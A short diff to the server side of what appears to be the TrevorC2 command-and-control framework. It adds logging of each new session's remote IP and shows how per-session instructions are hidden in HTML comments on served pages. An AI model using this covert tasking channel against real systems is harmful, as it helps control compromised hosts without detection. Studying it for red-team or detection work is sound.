@@ -280,7 +280,9 @@ class RPQ(tornado.web.RequestHandler):
         if self.get_cookie(COOKIE_SESSIONID_STRING):
             sid = self.get_cookie(COOKIE_SESSIONID_STRING)
             if sid not in instructionsdict:
-                register_assets(sid, 'unknown', 'unknown')
+                print("\n*** Received connection from {} and hostname {} with communication sid {} for TrevorC2.".format(
+                        remote_ip, 'unknown', sid))
+                register_assets(sid, 'unknown', remote_ip)
                 set_instruction(sid, 'nothing')
             instructions = instructionsdict[sid]
             site_data = site_data.replace("</body>", "<!-- %s%s --></body>" % (STUB, instructions))
